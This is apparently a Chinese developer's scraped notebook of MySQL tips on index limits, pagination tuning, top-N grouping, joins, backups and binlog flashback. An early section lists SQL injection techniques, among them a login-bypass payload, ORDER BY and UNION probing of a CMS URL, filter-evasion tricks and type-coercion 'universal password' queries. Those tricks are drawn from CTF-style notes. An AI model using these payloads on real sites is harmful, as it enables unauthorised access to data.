767```javascript使用 mysql5.7 没有问题，可以正常 migrate,使用 mysql5.6 时，就出现这个问题，把字段长度缩小可以解决由于 MySQL Innodb 引擎表索引字段长度的限制为 767 字节，因此对于多字节字符集的大字段（或者多字段组合索引），创建索引会出现上面的错误。以 utf8mb4 字符集 字符串类型字段为例：utf8mb4 是 4 字节字符集，则默认支持的索引字段最大长度是： 767 字节 / 4 字节每字符 = 191 字符，因此在 varchar (255) 或 char (255) 类型字段上创建索引会失败。https://learnku.com/laravel/t/28819处理方案：在 App\Providers\AppServiceProvider 的 boot () 方法中添加 \Illuminate\Support\Facades\Schema::defaultStringLength(191); 即可 SQL 注入1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162select * from user where username='' and pass=''# 构造 username=devnull' or '1后，sql 语句变成select * from user where username='devnull' or '1' and pass=''SELECT * from users t where t.username=a()// 报错信息，数据库名是 test_db[Err] 1305 - FUNCTION test_db.a does not exist# 原始的http://192.168.137.140/cms/show.php?id=35# 后面加上 order by 数字，就会按照第几个字段进行排序，如果没有会报错http://192.168.137.140/cms/show.php?id=35 order by 16mysql执行：语句正常；# mssql执行：语句错误，数据类型不匹配，无法正常执行select id,username from users union select 1,2; # oracle执行：语句错误，数据类型不匹配select id,username from users union select 1,2 from dual;// 使用括号，select, from , where 这些关键字不能用括号select(table_name)from(information_schema.tables)where(table_schema)=database()// 使用内联注释select/*1*/username/*1*/from/*1*/users// 使用%0a 绕过1 or 1 == 0x31206f722031不区分大小写select * from table_name where a like 'a%'select * from table_name where a regexp '^a'# 区分大小写select * from table_name where binary a like 'a%'select * from table_name where binary a regexp '^a'如果是数字开头的，则会变成前面的字符串 '123abc' == 123'abc' == 0# 可以把username不以数字开头的数据取出来select * from users WHERE username=0;# 'abc' + 0 为 0select 'abc' + 0;# 'abc' + 123 为 123select 'abc' + 123;# 'abc' + '0' 为 0，做加法运算的时候，两边都变成数字 select 'abc' + '0';获取所有用户名和密码不为0的数据，利用这种方式可以构造万能密码 et/2018/10/29/ctf-sqli-notes/select * from users where username=0 and password=0select * from users where username='abcd' + '0' and password='abc' + '0'``` ### limit 优化```javascript在偏移量非常大的时候，例如可能是LIMIT 1000,20这样的查询，这时MySQL需要查询10020条记录然后只返回最后20条，前面1000条记录都被抛弃，这样的代价非常高。如果所有的页面被访问的频率相同，那么这样的查询平均需要访问半个表的数据。要优化这种查询，要么是在页面中限制分页的数量，要么是优化大偏移量的性能。优化此类分页查询的一个最简单的办法就是尽可能地使用索引覆盖扫描，而不是查询所有的列。考虑下面的查询：select id,desc from film order by title limit 50000,10;select id,desc from file inner join (select id from file order by title limit 50000,10) b on film.id=b.id;”延迟关联“将大大提升查询效率，它让MySQL扫描尽可能少的页面，获取需要访问的记录后再根据关联列回元表查询需要的所有列。这个技术也可以用于优化关联查询中的LIMIT子句。LIMIT和OFFSET的问题，其实是OFFSET的问题，它会导致MySQL扫描达赖给你不需要的行然后再抛弃掉。如果可以使用书签记录上次取数据的位置，那么下次就可以直接从该书签记录得位置开始扫描，这样就可以避免使用OFFSET。select id,desc from film where id&gt;5000 limit 10;https://shuwoom.com/?p=2659 取出一组热门作者及他们最近发表的 3 篇文章123456789101112131415161718192021222324252627282930313233343536373839404142$users = \App\Models\User::limit(10)-&gt;get();$users = $users-&gt;map(function ($user) &#123; //可以考虑$user-&gt;id缓存,在保证了速度的同时避免大面积的缓存重建 $user-&gt;posts = $user-&gt;posts()-&gt;limit(3)-&gt;get(); return $user;&#125;);return $users;SELECT posts.*, @number := IF (@current_user_id = `user_id`, @number + 1, 1) AS number, @current_user_id := `user_id`FROM (select * from `posts` where `posts`.`user_id` IN (572, 822, 911, 103, 234, 11, 999, 333, 121, 122) order by `posts`.`user_id` ASC) AS postsHAVING number &lt;= 3简单解析一下这个 sql 语句.https://learnku.com/articles/24787#repliesFORM 为一个子查询，初步筛选出我们需要的作者的所有文章，且正序排列后生成一个临时表.SELECT 为上面临时表添加标号，添加的方式如下. (你需要从上往下一行行一行的观察，与 select 的执行方式一致即可)MySQL 中调用未定义的变量，其值默认为 null.id user_id @current_user_id if 判断 @number1 1 null false, number 被赋值为 1 12 1 1 true, @number = @number + 1 23 1 1 true, @number = @number + 1 34 1 1 true, @number = @number + 1 45 2 1 false, number 被赋值为 1 16 2 2 true, @number = @number + 1 2.. .. .. .. ..HAVING 执行于 SELECT 之后，其再次筛选上面的临时表，只取 number &lt;= 3 的 行.select *, substring_index(group_concat(id order by id desc), ',', 10) from ordersgroup by sid;User::with(['posts'=&gt;function($query)&#123; $query-&gt;whereRaw('3 &gt; (select count(*) from posts as sub where sub.user_id = posts.user_id and sub.id &gt; posts.id ) ') -&gt;orderByDesc('id'); &#125;])-&gt;get(); 多更新1update your_table set is_default = (case when id = 3 then 1 else 0 end) MySQL 调优经历123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778create table `users` ( `id` int(10) unsigned not null auto_increment, `name` varchar(255) default 'name', `a` varchar(255) default 'aaaaaaaaaaaaaaaa', `b` varchar(255) default 'bbbbbbbbbbbbbbbb', `c` varchar(255) default 'cccccccccccccccc', primary key (`id`)) engine=innodb;delimiter ;; create procedure usersdata() begin declare i int; set i=1; while(i&lt;=4000)do insert into users(`name`) values('name'); set i=i+1; end while; end;;delimiter ;call usersdata();create table `user_enterprises` ( `id` int(11) unsigned not null auto_increment, `user_id` int(11) default null, primary key (`id`)) engine=innodb;delimiter ;; create procedure enterprisesdata() begin declare i int; set i=1; while(i&lt;=4000)do insert into user_enterprises(`user_id`) values(i); set i=i+1; end while; end;;delimiter ;call enterprisesdata();select * from `users` left join `user_enterprises` on `users`.`id` = `user_enterprises`.`user_id` order by `users`.`id` desc;首先把 users 表的所有数据加入到 join buffer 中。扫描整个 user_enterprises 表的每一行数据，与 join buffer 中的 users 数据作对比，将满足条件的加入结果集。/* 打开 optimizer_trace，只对本线程有效 */SET optimizer_trace='enabled=on'; /* @a 保存 Innodb_rows_read 的初始值 */select VARIABLE_VALUE into @a from performance_schema.session_status where variable_name = 'Innodb_rows_read';/* 执行语句 */select * from `users` left join `user_enterprises` on `users`.`id` = `user_enterprises`.`user_id` order by `users`.`id` desc;/* @b 保存 Innodb_rows_read 的当前值 */select VARIABLE_VALUE into @b from performance_schema.session_status where variable_name = 'Innodb_rows_read';/* 计算 Innodb_rows_read 差值 */select @b-@a;我们得到的扫描行数是 12000。在执行 join 的时候，扫描行数应该是 4000 + 4000，还有 4000 的扫描行数我推测应该是回表取了数据。启用 optimizer_trace 调试：/* 打开 optimizer_trace，只对本线程有效 */set optimizer_trace='enabled=on'; /* 执行语句 */select * from `users` left join `user_enterprises` on `users`.`id` = `user_enterprises`.`user_id` order by `users`.`id` desc;/* 查看 OPTIMIZER_TRACE 输出 */select * from `information_schema`.`optimizer_trace`;我们看到使用的排序方法是 rowid 排序，select @@max_length_for_sort_data 的结果为 1024，即参与排序的字段大于了这个值，mysql 会把排序字段和主键取出来放入 sort buffer，完成排序后回表取数据。在这儿还用到了临时表。所以大致执行过程应该是 join 之后把数据存在了临时表，然后使用 rowid 排序。从上面我们发现这个过程是复杂的，如果在 user_enterprises 表上给 user_id 加上索引。alter table `user_enterprises` add key `user_id_index` (`user_id`);首先 join 的执行流程发生了变化，大体流程是：在 users 表里取出一行数据根据索引在 user_enterprises 表里获取结果，组成结果集我们发现使用到了索引后，就没有在 join buffer 里那些复杂操作了。因为索引的有序性，排序也免了，整个查询过程所需要的时间也大大减少。https://learnku.com/articles/28964 exists12345678910111213141516171819https://learnku.com/articles/29168SELECT sql_no_cache `product_id`FROM`zx_tests` AS aWHERE`pn_id` = 101 AND `pv_id` = 59 AND EXISTS( SELECT sql_no_cache * FROM `zx_tests` WHERE a.product_id = product_id and `pn_id` = 101 AND `pv_id` = 171);2 组条件下 0.657，3 组 0.695，4 组 0.759，5 组 0.743SELECT `product_id` FROM `product` WHERE `pn_id` = 5 AND `pv_id` = 135 AND `product_id` IN (SELECT `product_id` FROM `product` WHERE `pn_id` = 11 AND `pv_id` = 23); 2 组条件下 0.729，3 组 0.75，4 组 0.730，5 组 0.757 批量更新所有字段字符集1234567891011121314151617181920begin declare f_name varchar(100); declare b int default 0; /*是否达到记录的末尾控制变量*/ -- 注意修改下面的数据库名称 wsm_aliyun declare table_name cursor for SELECT TABLE_NAME FROM information_schema.TABLES where TABLE_SCHEMA = 'construction_online'; DECLARE CONTINUE HANDLER FOR NOT FOUND SET b = 1; OPEN table_name; REPEAT FETCH table_name INTO f_name; /*获取第一条记录*/ SET @STMT :=CONCAT("ALTER TABLE ",f_name," CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;"); PREPARE STMT FROM @STMT; EXECUTE STMT; -- INSERT into TestTable(name) VALUES (f_name); -- ALTER TABLE f_name CONVERT TO CHARACTER SET utf8 COLLATE utf8_general_ci; UNTIL b = 1 END REPEAT; close table_name;endhttps://wi1dcard.cn/posts/mysql-update-all-collations/ 每门科目成绩前三的数据12345678910111213141516表：student_score，姓名：name，科目：subject，分数 scoreSELECT a.*FROM student AS aLEFT JOIN student AS b ON a.`subject` = b.`subject`AND a.score &lt; b.scoreGROUP BY a.id, a. SUBJECT, a.scoreHAVING COUNT(b.id) &lt; 3ORDER BY a.`subject`, a.score DESC 删除表中重复数据，并保留一条12345678910111213141516171819DELETE FROM student WHERE(`name`,`subject`,score) IN ( SELECT t.name,t.subject,t.score FROM ( SELECT `name`,`subject`,score FROM student GROUP BY `name`,`subject`,score HAVING COUNT(1)&gt;1 )t)AND id not in( SELECT a.minId FROM ( SELECT id as minId FROM student GROUP BY `name`,`subject`,score HAVING COUNT(1)&gt;1 )a)所有科目成绩都大于 80 分的学生数据select name from student group by name having min(score)&gt;80;https://learnku.com/articles/29467 并列排名和顺序排名查询1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980获取分数排名，要求并列排名。如果两个分数相同，则两个分数排名（rank）相同。名次之间不应该有“间隔”。id score1 992 803 874 605 806 99select id, score, (select count(distinct(score)) from scores as b where b.score &gt; a.score ) + 1 as rank from scores as a order by rank;select id, score, (select count(distinct(score)) from scores as b where b.score &gt; a.score ) + 1 as rank from scores as a order by rank;https://learnku.com/articles/27599select t.id, t.score,@rowNum := @rowNum +1 as rank from (select @rowNum :=0) r, scores as t order by t.score desc ;id score rank1 99 16 99 13 87 22 80 35 80 34 60 4 INNER JOIN...ON...: 返回俩表关联的所有行，不执行上面说的第三部JOIN添加外部行。 LEFT JOIN...ON... : 返回左表中的所有行，若有些行在右表中没有对应的值，将会使用NULL填充。 RIGHT JOIN...ON...: 返回右表中的所有行，若有些行在左表中没有对应的值，将会使用NULL填充。 SELECT * FROM user_info as i LEFT JOIN user_account as a ON i.userid = a.userid and i.userid = 1003; SELECT * FROM user_info as i LEFT JOIN user_account as a ON i.userid = a.userid where i.userid = 1003; 第一种情况 LEFT JOIN 在执行完第二步 ON 子句后，筛选出满足 i.userid = a.userid and i.userid = 1003 的行，生成表 vt2，然后执行第三步 JOIN 子句，将外部行添加进虚拟表生成 vt3 即最终结果： vt2: | userid | name | userid | money | | -------- | -------- | -------- | -------- | | 1003 | z | 1003 | 8 | vt3: | userid | name | userid | money | | -------- | -------- | -------- | -------- | | 1001 | x | NULL | NULL | | 1002 | y | NULL | NULL | | 1003 | z | 1003 | 8 | | 1004 | a | NULL | NULL | | 1005 | b | NULL | NULL | | 1006 | c | NULL | NULL | | 1007 | d | NULL | NULL | | 1008 | e | NULL | NULL | 而第二种情况 LEFT JOIN 在执行完第二步 ON 子句后，筛选出满足 i.userid = a.userid 的行，生成表 vt2；再执行第三步 JOIN 子句添加外部行生成表 vt3；然后执行第四步 WHERE 子句，再对 vt3 表进行过滤生成 vt4，得的最终结果： vt2: | userid | name | userid | money | | -------- | -------- | -------- | -------- | | 1001 | x | 1001 | 22 | | 1002 | y | 1002 | 30 | | 1003 | z | 1003 | 8 | vt3: | userid | name | userid | money | | -------- | -------- | -------- | -------- | | 1001 | x | 1001 | 22 | | 1002 | y | 1002 | 30 | | 1003 | z | 1003 | 8 | | 1004 | a | NULL | NULL | | 1005 | b | NULL | NULL | | 1006 | c | NULL | NULL | | 1007 | d | NULL | NULL | | 1008 | e | NULL | NULL | vt4: | userid | name | userid | money | | -------- | -------- | -------- | -------- | | 1003 | z | 1003 | 8 | 如果将上例的 LEFT JOIN 替换成 INNER JOIN，不论将条件过滤放到 ON 还是 WHERE 里，结果都是一样的，因为 INNER JOIN 不会执行第三步添加外部行。 SELECT * FROM user_info as i INNER JOIN user_account as a ON i.userid = a.userid and i.userid = 1003; SELECT * FROM user_info as i INNER JOIN user_account as a ON i.userid = a.userid where i.userid = 1003; 返回结果都是： | userid | name | userid | money | | -------- | -------- | -------- | -------- | | 1003 | z | 1003 | 8 | https://learnku.com/articles/27701 MySQL 分页数据错乱重复1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859select xx from table_name wheere xxx order by 字段A limit offset;，表数据总共 48 条，分页数量正常，但出现了结果混杂的情况，第一页的数据出现在了第二页上；如果 order by 字段B 就不会出现这个现象mysql 5.6 create table glon( -&gt; id int not null auto_increment primary key, -&gt; name varchar(20) not null, -&gt; create_time datetime not null, -&gt; age tinyint unsigned default 18 -&gt; );INSERT INTO `glon` VALUES (1, 'Eason Chan', '2017-05-02 08:10:10', 19),(2, 'Glon Ho', '2017-05-03 12:10:10', 18),(3, '赵敏', '2017-05-03 14:10:10', 17),(4, 'Jacky Cheung', '2017-05-02 14:00:00', 22),(5, '周芷若', '2017-05-02 14:00:00', 16),(6, 'Andy Lau', '2017-05-02 14:00:00', 50),(7, '至尊宝', '2017-05-02 14:00:00', 20),(8, '刘三姐', '2017-05-02 14:00:00', 19);root@localhost [glon_ho]&gt;select * from glon;+----+--------------+---------------------+------+| id | name | create_time | age |+----+--------------+---------------------+------+| 1 | Eason Chan | 2017-05-02 08:10:10 | 19 || 2 | Glon Ho | 2017-05-03 12:10:10 | 18 || 3 | 赵敏 | 2017-05-03 14:10:10 | 17 || 4 | Jacky Cheung | 2017-05-02 14:00:00 | 22 || 5 | 周芷若 | 2017-05-02 14:00:00 | 16 || 6 | Andy Lau | 2017-05-02 14:00:00 | 50 || 7 | 至尊宝 | 2017-05-02 14:00:00 | 20 || 8 | 刘三姐 | 2017-05-02 14:00:00 | 19 |+----+--------------+---------------------+------+root@localhost [glon_ho]&gt;select * from glon ORDER BY create_time limit 0, 4;+----+--------------+---------------------+------+| id | name | create_time | age |+----+--------------+---------------------+------+| 1 | Eason Chan | 2017-05-02 08:10:10 | 19 || 8 | 刘三姐 | 2017-05-02 14:00:00 | 19 || 6 | Andy Lau | 2017-05-02 14:00:00 | 50 || 4 | Jacky Cheung | 2017-05-02 14:00:00 | 22 |+----+--------------+---------------------+------+4 rows in set (0.00 sec)root@localhost [glon_ho]&gt;select * from glon ORDER BY create_time limit 4, 4;+----+-----------+---------------------+------+| id | name | create_time | age |+----+-----------+---------------------+------+| 7 | 至尊宝 | 2017-05-02 14:00:00 | 20 || 8 | 刘三姐 | 2017-05-02 14:00:00 | 19 || 2 | Glon Ho | 2017-05-03 12:10:10 | 18 || 3 | 赵敏 | 2017-05-03 14:10:10 | 17 |+----+-----------+---------------------+------+4 rows in set (0.00 sec)两次查询结果中都出现了 id 为 8 的刘三姐，从上面初始化数据来看，总共有 8 条数据，现在不但分页出现重复数据，还丢了一条！select * from glon ORDER BY create_time,id limit 0, 4;+----+--------------+---------------------+------+| id | name | create_time | age |+----+--------------+---------------------+------+| 1 | Eason Chan | 2017-05-02 08:10:10 | 19 || 4 | Jacky Cheung | 2017-05-02 14:00:00 | 22 || 5 | 周芷若 | 2017-05-02 14:00:00 | 16 || 6 | Andy Lau | 2017-05-02 14:00:00 | 50 |order by 排序的时候，如果排序字段中有多行相同的列值，则排序结果是不确定的。所以后面的几组组合形式的排序或者是主键 id 的排序，因为唯一性高，所以排序是确定的，不会出现结果混乱的问题。最简单的方法就是在排序列（如 create time）上加索引，然后在 order by 上明示 primary key，这个问题就非常圆满的解决了。https://www.cnblogs.com/glon/p/6806064.html MySQL 闪回工具之 binlog2sql12345678910111213141516171819202122232425262728直接整个解析 mysql-bin.000001 日志[root@node1 binlog2sql]# python binlog2sql.py -h127.0.0.1 -P3306 -uglon -p'123456' -dglonho -ttest --start-file='mysql-bin.000001'USE glonho;CREATE TABLE `test` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(20) NOT NULL, `create_time` datetime NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;INSERT INTO `glonho`.`test`(`create_time`, `id`, `name`) VALUES ('2012-10-01 00:00:00', 1, 'Glon Ho'); #start 547 end 772 time 2017-05-12 15:02:23INSERT INTO `glonho`.`test`(`create_time`, `id`, `name`) VALUES ('2016-05-02 00:00:00', 2, 'Eason Chan'); #start 547 end 772 time 2017-05-12 15:02:23[root@node1 binlog2sql]# python binlog2sql.py --flashback -h127.0.0.1 -P3306 -uglon -p'123456' -dglonho -ttest --start-file='mysql-bin.000001' --start-datetime="2017-05-12 14:57:00" --stop-datetime="2017-05-12 15:04:22"INSERT INTO `glonho`.`test`(`create_time`, `id`, `name`) VALUES ('2015-05-02 00:00:00', 3, 'Jacky Cheung'); #start 1164 end 1350 time 2017-05-12 15:04:03UPDATE `glonho`.`test` SET `create_time`='2012-10-01 00:00:00', `id`=1, `name`='Glon Ho' WHERE `create_time`='2017-05-12 00:00:00' AND `id`=1 AND `name`='Glon Ho' LIMIT 1; #start 868 end 1068 time 2017-05-12 15:03:341、在配置文件中设置了以下参数：[mysqld]server_id = 1log_bin = /var/log/mysql/mysql-bin.logmax_binlog_size = 1Gbinlog_format = rowbinlog_row_image = full # 默认2、在闪回的时候必须启动 MySQL 服务，因为它是通过 BINLOG_DUMP 协议来获取 binlog 内容，需要读取server端 information_schema.COLUMNS 表，来获取表结构的元信息，才能拼接成 SQL 语句。因此需要给用户提供的最小权限如下：GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'user'@'%';https://www.cnblogs.com/glon/p/6856192.html You can’t specify target table for update1234567891011mysql不允许update目标表和子查询里面的表为同一张表错误sql：UPDATE mg_brand set `status`='0' where iID=(SELECT id from mg_industry where `name`='汽车') and id in (SELECT id from mg_brand WHERE nameC = '欧宝' or pID = (SELECT id from mg_brand WHERE nameC = '欧宝'));解决办法：子查询sql可以改变双层的子查询，即可执行成功示例sql:UPDATE mg_brand SET `status` = '0' WHERE iID = ( SELECT id FROM mg_industry WHERE `name` = '汽车' ) AND id IN ( SELECT id FROM (SELECT id FROM mg_brand) AS temp WHERE nameC = '欧宝' OR pID = ( SELECT id FROM ( SELECT id FROM mg_brand WHERE nameC = '欧宝' ) AS te WHERE 1 )); 分组无数据查询填充012345678910111213141516171819202122232425262728293031323334353637383940414243select date(t.create_time) as `date`, count(t.id) as numfrom t_user tgroup by `date`;select * from (SELECT DATE_FORMAT(DATE_SUB('2019-05-09', INTERVAL xc day), '%Y-%m-%d') as day FROM (SELECT @xi := @xi + 1 as xc from (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) xc1, (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) xc2, (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) xc3, (SELECT @xi := -1) xc0 ) as t) as t2 where t2.`day` &gt; '2019-05-02' and t2.`day` &lt;= '2019-05-09'select t2.`day` as `date`, count(t.id) as numfrom (SELECT DATE_FORMAT(DATE_SUB('2019-05-09', INTERVAL xc day), '%Y-%m-%d') as day FROM ( SELECT @xi := @xi + 1 as xc from (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) xc1, (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) xc2, (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5) xc3, (SELECT @xi := -1) xc0 ) as x1x2x) t2 left join t_user t on date(t.create_time) = t2.daywhere t2.`day` &gt; '2019-05-02' and t2.`day` &lt;= '2019-05-09'group by date ORDER BY date asc;+------------+-----+| date | num |+------------+-----+| 2019-05-03 | 0 |+------------+-----+| 2019-05-04 | 0 |+------------+-----+| 2019-05-05 | 0 |+------------+-----+| 2019-05-06 | 2 |+------------+-----+| 2019-05-07 | 0 |+------------+-----+| 2019-05-08 | 2 |+------------+-----+| 2019-05-09 | 9 |+------------+-----+http://nullpointer.pw/Mysql%E6%97%A5%E6%9C%9F%E5%88%86%E7%BB%84%E6%97%A0%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%E5%A1%AB%E5%85%850.html 保留 IN 中的顺序12SELECT * FROM `user_temporary` WHERE ( `id` IN ('29500','29582','29583','28299') ) LIMIT 0, 20;SELECT * FROM `user_temporary` WHERE ( `id` IN ('29500','29582','29583','28299'') ) ORDER BY field(id,29500,29582,29583,28299) LIMIT 0, 20; 分组取前31234567891011121314151617181920212223242526272829303132333435363738394041424344454647cs_goods 表结构id goods_id cs_merchant_id created_at1 234 3 2019-07-09 19:45:332 33 3 2019-07-10 19:45:333 44 3 2019-07-11 19:45:334 55 3 2019-07-01 19:45:335 33 5 2019-07-02 19:45:336 44 5 2019-07-08 19:45:337 55 6 2019-07-06 19:45:33需求：获取 cs_goods 表中的所有商品，但同一个超市最多只能出现 3 个商品（cs_merchant_id 是超市 id），并用 created_at 进行倒序排列，最后的结果应该是 3 2 1 6 7 5 https://learnku.com/laravel/t/31355原生sql：SELECT a.* FROM cs_goods a WHERE ( SELECT COUNT(*) FROM cs_goods WHERE cs_merchant_id = a.cs_merchant_id AND id &gt; a.id ) &lt; 3 ORDER BY a.created_at desc;SELECT`a`.* FROM`cs_goods` AS `a` WHERE( SELECT COUNT(`b`.`id`) FROM `cs_goods` AS b WHERE `b`.`cs_merchant_id` = `a`.`cs_merchant_id` AND `b`.`created_at` &gt; `a`.`created_at` ) &lt; 3 ORDER BY`a`.`created_at` DESC;SELECT`a`.* FROM`cs_goods` AS `a`LEFT JOIN `cs_goods` AS `b` ON `a`.`cs_merchant_id` = `b`.`cs_merchant_id` AND `b`.`created_at` &gt; `a`.`created_at` GROUP BY`a`.`id` HAVINGCOUNT( b.id ) &lt; 3 ORDER BY`a`.`created_at` DESC \DB::table('cs_goods as a') -&gt;select('a.*') -&gt;leftJoin('cs_goods as b', function ($join)&#123; return $join-&gt;on('a.cs_merchant_id','=','b.cs_merchant_id') -&gt;on('b.created_at','&gt;','a.created_at'); &#125;) -&gt;groupBy('a.id') -&gt;havingRaw('COUNT(b.id) &lt; 3') -&gt;orderByDesc('a.created_at') -&gt;toSql(); 升级mongodb31234567891011121314151617181920Server at 10.23.2.1:27017 reports wire version 2, but this version of libmongoc requires at least 3 (MongoDB 3.0) https://segmentfault.com/a/1190000004547368curl https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.0.9.tgz tar -xvzf mongodb-linux-x86_64-3.0.9.tgz cd mongodb-linux-x86_64-3.0.9[root@localhost ~]# ps aux|grep mongoroot 6217 0.2 0.3 4773512 37412 ? Sl May06 232:35 mongod --fork --dbpath=/data2/mongodb --logpath=/data2/mongodb/mongodb.log --logappendroot 28665 0.0 0.0 103256 844 pts/1 S+ 16:19 0:00 grep mongo[root@localhost ~]# kill -9 6217[root@localhost ~]# /data1/projects/mongodb-linux-x86_64-3.0.9/bin/mongod --fork --dbpath=/data2/mongodb --logpath=/data2/mongodb/mongodb.log --logappendabout to fork child process, waiting until server is ready for connections.forked process: 29713child process started successfully, parent exiting[root@localhost ~]# /data1/projects/mongodb-linux-x86_64-3.0.9/bin/mongoMongoDB shell version: 3.0.6connecting to: testServer has startup warnings: Mysql 大表分页查询优化12345678910111213141516171819select id, content from table_name where status = 1 order by id asc limit 1328000, 1000执行了 90 秒，扫描了 1329172 行。改写成select a2.id, a2.content from (select id from table_name where status = 1 order by id asc limit 1328000, 1000) a1, table_name a2 where a1.id=a2.id;SELECT * FROM table_name a1 INNER JOIN (SELECT id FROM table_name ORDER BY id LIMIT 1328000,1000) a2 ON a1.id=a2.idselect id from table_name where id&gt;73575000 order by id asc limit 0, 5000执行时间19.63msselect a2.id,a2.keyword,a2.url from (select id from table_name where id&gt;73575000 order by id asc limit 0, 5000) a1, table_name a2 where a1.id=a2.id执行时间26.35ms，又可以愉快的玩耍了。或者直接select id,keyword,url from table_name where id&gt;73575000 order by id asc limit 0, 5000https://mengkang.net/1300.html 不区分大小写123456789101112131415161718192021 insert into tableName(date,workflow,cou) values('2019-01-04','tx',10000);insert into tableName(date,workflow,cou) values('2019-01-04','Tx',100000);alter table statistic_daily_workflow_count modify column workflow varchar(170) binary character set utf8 collate utf8_bin;创建表时字段指定binarycreate table PlainText(Content nvarchar(50) binary,primary key(Content));修改列指定binary -- 修改列ALTER TABLE `Md5Data`.`PlainText` CHANGE COLUMN `Content` `Content` VARCHAR(55) CHARACTER SET 'utf8' BINARY NOT NULL DEFAULT '' ;select * from usertable where binary id = 'A';http://www.ikeguang.com/2019/01/05/mysql-unique/ MySQL 备份1234567891011121314[root@localhost mc_orderdb]# mysqldump -ubackup -p --master-data=2 --single-transaction --routines --triggers --events --tab="/tmp/mc_orderdb" mc_orderdbEnter password: ---- Position to start replication or point-in-time recovery from---- CHANGE MASTER TO MASTER_LOG_FILE='mysql_bin.000009', MASTER_LOG_POS=1095;mysqldump: Got error: 1: Can't create/write to file '/tmp/mc_orderdb/order_cart.txt' (Errcode: 13 - Permission denied) when executing 'SELECT INTO OUTFILE'1. 权限问题：chown mysql:mysql mc_orderdb/2. 关闭防火墙selinux shell&gt;vi /etc/selinux/config SELINUX=disabled3. shell&gt;setsebool -P mysqld_disable_trans=1 groupBy 分组统计123456789101112131415161718192021222324252627282930313233343536373839404142434445数据中 4 号～7 号的时间段没有返回，我们理想中的返回格式是补全没有的日期，然后在这个日期对应的数量字段填 0。在网上 google 了一下，解决方案是新建一张自期表做主表，左联要统计的表，CREATE TABLE num (i int);-- 创建一个表用来储存0-9的数字INSERT INTO num (i) VALUES (0), (1), (2), (3), (4), (5), (6), (7), (8), (9);-- 生成0-9的数字，方便以后计算时间CREATE TABLE if not exists calendar(datelist date); -- 生成一个存储日期的表，datalist是字段名-- 这里是生成并插入日期数据INSERT INTO calendar(datelist) SELECT adddate( ( -- 这里的起始日期，你可以换成当前日期 DATE_FORMAT("2016-1-1", '%Y-%m-%d') ), numlist.id ) AS `date`FROM ( SELECT n1.i + n10.i * 10 + n100.i * 100 + n1000.i * 1000+ n10000.i * 10000 AS id FROM num n1 CROSS JOIN num AS n10 CROSS JOIN num AS n100 CROSS JOIN num AS n1000 CROSS JOIN num AS n10000 ) AS numlist;运行 sql 语句后，请删除 num 表数据库在通过连接两张或多张表来返回记录时，都会生成一张中间的临时表，然后再将这张临时表返回给用户；where 条件是在临时表生成好后，再对临时表进行过滤的条件；因此：where 条件加上，已经没有 left join 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。解决方案是把限制条件放在 on 后面select a.*,b.*from table1 aleft join table2 b on b.X=a.X and XXX结论：where 后面：是先连接然生成临时查询结果，然后再筛选on 后面：先根据条件过滤筛选，再连 生成临时查询结果https://learnku.com/articles/26796 导入文件1234567修改 my.cnf [mac]，my.ini.[win],secure-file-priv='txt 文本存放的目录'重启 mysql\t 是 txt 文本中的字段区分，\n 是文本行的结尾，sys_log20190731 表名80000000.txt 要放到你给权限的目录的下，secure-file-priv='txt 文本存放的目录'load data infile 'mypath/80000000.txt' ignore into table sys_log20190731 character set gbk fields terminated by '\t' enclosed by '"' lines terminated by '\n' (`field1`,`field2`,`field3`,`field4`,`field5`,`field6`,`field7`);https://learnku.com/articles/31979 关联查询1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768内连接分为三类 - 等值连接：on a.id = b.id - 不等值连接：on a.id &gt; b.id - 自连接：select * from a t1 inner join a t2 on t1.id = t2.id //创建student表，并插入测试数据 create table student( id int unsigned primary key auto_increment, name char(10) not null ); insert into student(name) values('小明'),('小红'); //创建course表，并插入测试数据 create table course( id int unsigned primary key auto_increment, name char(20) not null ); insert into course(name) values('PHP'),('JAVA'); //创建student_course表，并插入测试数据 create table student_course( sid int unsigned, cid int unsigned, score int unsigned not null, foreign key (sid) references student(id), foreign key (cid) references course(id), primary key(sid, cid) ); insert into student_course values(1,1,80),(1,2,90),(2,1,90),(2,2,70); 查询 student 表中重名的学生，结果包含 id 和 name，按 name 升序 select id,name from student where name in ( select name from student group by name having(count(*) &gt; 1) ) order by name ASC; 查询每个学生的总成绩，结果列出学生姓名和总成绩。 select name,sum(score) from student left join student_course on student.id=student_course.sid group by sid; +------+------------+ | name | sum(score) | +------+------------+ | ??? | 170 | | ?? | 160 | 在 student_course 表查询各科成绩最高的学生，结果列出学生 id、课程 id 和对应的成绩 select * from student_course as x where score&gt;= (select max(score) from student_course as y where cid=x.cid); +-----+-----+-------+ | sid | cid | score | +-----+-----+-------+ | 1 | 2 | 90 | | 2 | 1 | 90 | +-----+-----+-------+ 在 student_course 表中查询每门课成绩都不低于 80 的学生 id select distinct sid from student_course where sid not in ( select sid from student_course where score &lt; 80); +-----+ | sid | +-----+ | 1 | +-----+ https://learnku.com/articles/32039 MySQL大数据分页123456789101112131415161718SELECT * FROM test where status = 1 limit start, 1000select * from test a , (select id from test where status = 1 limit 300000, 10) b where a.id = b.id;---10 rows in set (0.06 sec)select * from test inner join (select id from test limit 300000, 10) t2 using (id);---10 rows in set (0.06 